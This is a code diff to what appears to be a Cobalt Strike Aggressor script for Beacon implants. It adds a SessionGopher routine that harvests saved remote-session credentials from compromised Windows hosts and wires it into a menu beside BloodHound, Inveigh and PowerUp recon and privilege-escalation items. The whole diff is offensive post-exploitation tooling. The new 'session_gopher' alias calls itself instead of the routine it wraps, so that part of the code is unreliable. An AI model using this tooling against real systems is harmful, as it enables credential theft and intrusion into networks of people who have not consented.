@@ -44,6 +44,18 @@ alias inveigh {
     inveigh($1);
 }
 
+sub sessionGopher {
+    local('$bid');
+    $bid = $1;
+    bpowershell_import($bid, script_resource("scripts/SessionGopher.ps1"));
+    bcd($bid, "C:\\Temp");
+    bpowershell($bid, "Invoke-SessionGopher -o");
+}
+
+alias session_gopher {
+    session_gopher($1);
+}
+
 #### PRIVESC
 # Run PowerUp Invoke-AllChecks
 sub powerup {
@@ -57,31 +69,38 @@ alias powerup {
 
 # Add bindings to Beacon menu
 popup beacon_bottom {
-    menu "&Powershell" {
+    menu "P&owershell" {
         menu "&Recon" {
             item "BloodHound" {
                 local('$bid');
                 foreach $bid ($1) {
-                    bloodhound ($1);
+                    bloodhound ($bid);
                 }
             }
             item "BloodHound (Sessions)" {
                 local('$bid');
                 foreach $bid ($1) {
-                    bloodhoundSessionsOnly($1);
+                    bloodhoundSessionsOnly($bid);
                 }
             }
             separator();
             item "Inveigh" {
                 local('$bid');
                 foreach $bid ($1) {
-                    inveigh($1);
+                    inveigh($bid);
                 }
             }
             item "Inveigh (Unprivileged)" {
                 local('$bid');
                 foreach $bid ($1) {
-                    inveighUnprivileged($1);
+                    inveighUnprivileged($bid);
+                }
+            }
+            separator();
+            item "SessionGopher" {
+                local ('$bid');
+                foreach $bid ($1) {
+                    sessionGopher($bid)
                 }
             }
         }
@@ -89,7 +108,7 @@ popup beacon_bottom {
             item "PowerUp" {
                 local ('$bid');
                 foreach $bid ($1) {
-                    powerup($1);
+                    powerup($bid);
                 }
             }
         }
